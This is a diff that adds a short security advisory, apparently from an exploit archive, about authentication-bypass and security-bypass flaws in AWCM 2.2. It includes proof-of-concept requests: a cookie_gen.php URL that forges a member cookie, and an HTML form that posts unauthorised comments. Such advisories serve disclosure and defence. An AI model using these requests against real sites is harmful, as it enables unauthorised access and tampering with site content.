@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/56465/info
+
+AWCM is prone to an authentication-bypass and multiple security-bypass vulnerabilities.
+
+Attackers can exploit these vulnerabilities to bypass certain security restrictions, perform unauthorized actions; which may aid in further attacks.
+
+AWCM 2.2 is vulnerable; other versions may also be affected. 
+
+Authentication Bypass:
+
+http://www.example.com/awcm/cookie_gen.php?name=\'key\'&content=\'value\'
+ex) http://targethost/awcm/cookie_gen.php?
+name=awcm_member&content=123456
+
+Security Bypass:
+
+[form action=\"http://www.example.com/awcm/show_video.php?coment=exploit\"
+method=\"post\"]
+[input type=\"hidden\" name=\"coment\" value=\'insert
+uninvited comments 2\' /]
+[input type=\"submit\" value=\"Submit\"]
+</form>
